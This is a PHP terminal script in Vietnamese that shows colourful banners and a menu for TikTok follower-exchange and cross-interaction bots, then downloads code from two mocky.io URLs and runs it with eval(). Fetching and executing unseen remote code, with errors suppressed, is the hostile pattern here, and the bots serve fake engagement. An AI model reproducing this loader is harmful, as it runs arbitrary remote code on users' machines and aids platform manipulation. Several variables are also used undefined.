<?php
date_default_timezone_set('Asia/Ho_Chi_Minh');
error_reporting(0);
session_start();
$ress = "\033[0;32m";
$res = "\033[0;33m";
$red = "\033[0;31m";
$green = "\033[0;37m";
$yellow = "\033[0;33m";
$white = "\033[1;37m";
$xnhac = "\033[1;96m";
$den = "\033[1;90m";
$do = "\033[1;91m";
$luc = "\033[1;92m";
$vang = "\033[1;93m";
$xduong = "\033[1;94m";
$hong = "\033[1;95m";
$trang = "\033[1;97m";
$do="\033[1;91m";
$maufulldo= "\e[1;47;31m";
$res="\033[0m";
$red="\e[1;31m";
$pink="\e[1;35m";
$green="\e[1;32m";
$yellow="\e[1;33m";
$y2="\033[0;33m";
$cyan= "\e[1;36m";
$blue="\e[1;34m";
$ngreen="\033[42m";
$ngblack="\033[40m";
$nen="\033[1;47;1;34m";
@system('clear');
system('clear');
echo"
\033[1;91m██████╗ ██╗   ██╗███╗   ██╗ ██████╗    ████████╗ ██████╗  ██████╗ ██╗     
\033[1;92m██╔══██╗██║   ██║████╗  ██║██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
\033[1;91m██║  ██║██║   ██║██╔██╗ ██║██║  ███╗█████╗██║   ██║   ██║██║   ██║██║     
\033[1;94m██║  ██║██║   ██║██║╚██╗██║██║   ██║╚════╝██║   ██║   ██║██║   ██║██║     
\033[1;92m██████╔╝╚██████╔╝██║ ╚████║╚██████╔╝      ██║   ╚██████╔╝╚██████╔╝███████╗
\033[1;95m╚═════╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
  \n";   
@system('clear');
$weekday = strtolower($weekday);switch($weekday) { case 'monday': $weekday = "\033[1;33mThứ\033[1;36m 2"; break; case 'tuesday': $weekday = "\033[1;33mThứ\033[1;36m 3"; break; case 'wednesday': $weekday = "\033[1;33mThứ \033[1;36m4"; break; case 'thursday': $weekday = "\033[1;33mThứ \033[1;36m5"; break; case 'friday': $weekday = "\033[1;33mThứ\033[1;36m 6"; break; case 'saturday': $weekday = "\033[1;33mThứ \033[1;36m7"; break; default: $weekday = "\033[1;33mCN"; break; }
	if(!$sock = @fsockopen('www.google.com', 80))
{
    echo 'Vui lòng bật kết nối mạng';
    exit();
}
	back:
@system('clear');
system('clear');
echo"
\033[1;91mTrần Minh Quốc
\033[1;92m0879311332
\033[1;91mTIKTOK:khosharecodevn
\033[1;94mlmua key tại : https://quocregedit.tk
\033[1;92m30/06/2008
\033[1;95m╚═════╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
  \n";   
//Color
$xnhac = "\033[1;36m";
$do = "\033[1;31m";
$luc = "\033[1;32m";
$vang = "\033[1;33m";
$xduong = "\033[1;34m";
$hong = "\033[1;35m";
$trang = "\033[1;37m";
//codekey
@system('clear');
$pedat="\r\033[0;45m\033[1;36m🔰\033[1;97mSever Đang Hoạt Động Tốt\033[1;36m🔰\n";
$datxu="\r\033[0;41m\033[1;36m🔰\033[1;97mSever Đang Hoạt Động Rất Tốt\033[1;36m🔰\n";
$datxu1="\r\033[1;42m\033[1;36m🔰\033[1;97mSever Hoạt Động Vô Cùng Tốt\033[1;36m🔰\n";
$a=array("$pedat"=>"a","$datxu"=>"b","$datxu1"=>"c");
print_r(array_rand($a,1));
echo"\033[0m\033[1;35m
╔══════════════════════╗
║ \033[1;33m█ █ █ █ █ █ █ █ █ █\033[0m  \033[1;35m║ 100% \033[1;32m    \033[1;35m
╚══════════════════════╝\n ";usleep(0);
for ($makep=30;$makep > 0;$makep--){
echo $trang."▂";
usleep(5000);
echo $luc."▂";
}echo"\n";
echo "\n";
echo"   \033[1;97m╭═════════════════════════════════════════════════════╮\n";
for($i=11;$i<(strlen($t)+1);$i++){echo $t[$i];
  usleep(5000);
}
$t=
 $trang."          \033[1;37m\033[1;41m \033[1;32m🌺\033[;33mHôm Nay Là Ngày $ngay Tháng $thang Năm $nam\033[1;32m🌺 \033[0m\n";
for($i=11;$i<(strlen($t)+1);$i++){echo $t[$i];
  usleep(5000);
}

$t=
 $trang."          \033[1;97m\033[1;40m➻❥ Chức Bạn\033[1;97m\033[1;97m \033[1;92mNgày Mới Vui Vẽ\n";
for($i=11;$i<(strlen($t)+1);$i++){echo $t[$i];
  usleep(5000);
}

$t=
 $trang."          \033[1;97m\033[1;40m➻❥ Tool Được Khởi Động Vào\033[1;97m\033[1;97m: \033[1;92m".$tim.date("H:i:s")."\033[1;92m \n";
for($i=11;$i<(strlen($t)+1);$i++){echo $t[$i];
  usleep(5000);
}

$t=
 $trang. "          \033[1;97m\033[1;40m➻❥ Ip Của Bạn Là:\033[1;97m\033[1;97m \033[1;92m$ip \n";
for($i=11;$i<(strlen($t)+1);$i++){echo $t[$i];
  usleep(5000);
}
echo"   \033[1;97m╰═════════════════════════════════════════════════════╯\n";
for ($makep=30;$makep > 0;$makep--){
echo $trang."▂";
usleep(5000);
echo $luc."▂";
}echo"\n";
echo "\n";
      system('clear');
      
for ($makep=30;$makep > 0;$makep--){
echo $trang."▂";
usleep(2500);
echo $do."▂";
}echo"\n";
echo"   \033[1;37m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ \n";
echo"      \033[0;41m\033[1;37m\033[1;93m🔥Hôm Nay\033[0;41m ";echo"\033[0;41m\033[1;36m$weekday ";echo"\033[0;41m\033[1;33mNgày "; echo"\033[0;41m\033[1;36m$ngay ";echo"\033[0;41m\033[1;33mTháng "; echo"\033[0;41m\033[1;36m$thang ";echo"\033[0;41m\033[1;33mNăm "; echo"\033[0;41m\033[1;36m$nam$end🔥\033[0;00m"; echo "\n";
echo "      \033[1;97m\033[1;40m➻❥ Chú́c Bạn\033[1;97m\033[1;97m \033[1;92mNgày Mới Vui Vẽ\n";
echo "      \033[1;97m\033[1;40m➻❥ Tool Được Khởi Động Vào\033[1;97m\033[1;97m: \033[1;92m".$tim.date("H:i:s")."\033[1;92m \n";
echo "      \033[1;97m\033[1;40m➻❥ Tool VIP\033[1;97m\033[1;97m \033[1;92mBy Trọngg Đạii \n";
echo"\033[1;37m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ \n";                                                               
echo"__________________________________________________\n";
echo"\033[1;37m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ \n";
echo $trang."┃ ".$vang."    TOOL TRAO ĐỔI SUB ".$trang."    ┃\n";
echo"\033[1;37m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ \n";
echo "\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\n";
echo $do."[".$trang.">.<".$do."] ".$trang."=> ".$luc."Nhập ".$do."[".$vang."1".$do."] ".$luc."Tool Auto Trao Đổi Sub TikTok \n";
echo "\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\n";
echo"\033[1;37m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ \n";
echo $trang."┃ ".$vang."   TOOL TƯƠNG TÁC CHÉO ".$trang."   ┃\n";
echo"\033[1;37m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ \n";
echo "\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\n";
echo $do."[".$trang.">.<".$do."] ".$trang."=> ".$luc."Nhập ".$do."[".$vang."2".$do."] ".$luc."Tool Auto Tương Tác Chéo TikTok \n";
echo "\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\033[1;93m-\033[1;92m-\n";
echo $do."[".$trang.">.<".$do."] ".$trang."=> ".$vang."Vui Lòng Nhập Chế Độ: $vang";
$chedo = trim(fgets(STDIN));
if(!$sock = @fsockopen("www.google.com", 80)){
    exit();
}
if ($chedo == '1')
        eval(get("https://run.mocky.io/v3/7c271598-d15c-4b58-9bb0-de1c2802120b"));
if ($chedo == '2')
        eval(get("https://run.mocky.io/v3/83a617da-330f-46f9-b02e-a70564ae48db"));
	function get($url){
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
    $headers[] = 'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Vui lòng kiểm tra lại kết nối hoặc có thể do lỗi máy chủ!';
    }
    curl_close($ch);
    return $result;
}